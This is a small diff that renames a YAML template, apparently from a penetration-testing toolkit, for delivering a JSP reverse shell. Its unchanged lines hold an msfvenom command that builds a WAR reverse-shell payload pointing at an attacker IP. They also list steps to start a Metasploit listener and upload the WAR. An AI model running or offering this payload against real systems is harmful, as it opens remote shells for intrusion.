@@ -1,6 +1,6 @@
 ---
 metadata:
-  filename: "deliver-jsp-revshell-msfvenom-tcp-nonstaged-war.yaml"
+  filename: "deliver-jsp-metasploit-nonstaged-tcp-war.yaml"
   tags: ["web", "shell", "linux"]
   created: "2025-03-29"
   authors: ["Unknown"]
@@ -11,7 +11,7 @@ content: |
   msfvenom -p java/jsp_shell_reverse_tcp LHOST={{ attacker_ip }} LPORT={{ shell_port }} -f war > packstation/outbound/revshell.war
   printf '%s\n' '================================================================'; \
   printf '%s\n' '                      ------Listener------                      '; \
-  printf '%s\n' '1. Start listener: {{ include('scripts/listener-msf-multi-handler-linux-x64-meterpreter-tcp-nonstaged.yaml') }}'; \
+  printf '%s\n' '1. Start listener: {{ include('scripts/listener-metasploit-linux-x64-meterpreter-nonstaged-tcp.yaml') }}'; \
   printf '%s\n' '================================================================'; \
   printf '%s\n' '                      ------Exploitation------                      '; \
   printf '%s\n' '2. Upload WAR file and visit endpoint'; \
